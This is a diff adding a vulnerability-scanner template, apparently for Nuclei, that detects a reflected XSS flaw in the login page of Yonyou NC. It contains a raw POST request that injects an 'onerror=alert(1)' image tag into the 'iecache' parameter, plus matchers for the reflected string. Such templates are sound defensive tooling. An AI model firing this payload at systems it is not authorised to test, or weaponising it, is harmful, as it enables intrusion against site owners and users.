@@ -1,0 +1,33 @@
+id: yongyou-nc-autotest-reflected-xss
+
+info:
+  name: 用友NC参数autotest存在反射型XSS漏洞
+  author: g3m
+  severity: high
+
+http:
+  - raw:
+    - |
+      @timeout 30s
+      POST /login.jsp HTTP/1.1
+      Host: {{Hostname}}
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
+      Content-Length: 61
+      Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+      Content-Type: application/x-www-form-urlencoded
+      Cookie: JSESSIONID=BEF887AAAD0D5543C9F4B11DD4AE800F
+      Range: bytes=0-10240
+      Upgrade-Insecure-Requests: 1
+
+      autotest=N&height=1080&iecache="><img+src=1+onerror=alert(1)>
+
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "<img src=1 onerror=alert(1)>"
+
+      - type: status
+        status:
+          - 200
